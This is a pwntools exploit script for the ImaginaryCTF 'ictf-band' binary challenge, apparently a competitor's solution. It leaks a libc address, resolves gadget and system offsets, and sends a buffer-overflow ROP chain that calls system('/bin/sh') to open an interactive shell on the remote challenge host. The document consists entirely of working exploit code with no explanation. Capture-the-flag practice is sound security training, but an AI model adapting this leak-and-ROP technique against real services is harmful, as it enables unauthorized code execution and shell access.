from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './ictf-band'
HOST = 'ictf-band.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(['./ld-linux-x86-64.so.2', TARGET])
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x20c5])

r.sendlineafter(b'>> ', b'1')
r.sendlineafter(b'[1-5]: ', b'0')
r.sendlineafter(b'Count: ', b'0')
r.sendlineafter(b'[y/n]: ', b'y')
r.sendlineafter(b'soon: ', b'16')
r.sendafter(b'e-mail: ', b'a'*0x10)
r.recvuntil(b'a'*0x10)
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
r.sendlineafter(b'[y/n]: ', b'y')

base = leak - 0x21b780

dbg('base')
rdi = base + 0x001bbea1
binsh = base + 0x1d8678
system = base + 0x50d70


payload = b''
payload += b'a'*(0x200-0x98-1)
payload += flat(rdi+1,rdi, binsh, system)

r.sendlineafter(b'>> ', b'4')
r.sendlineafter(b'Name: ', b'a')
r.sendlineafter(b'Age: ', str(len(payload)).encode())
r.sendlineafter(b'Life background: ', payload)

r.interactive()
r.close()

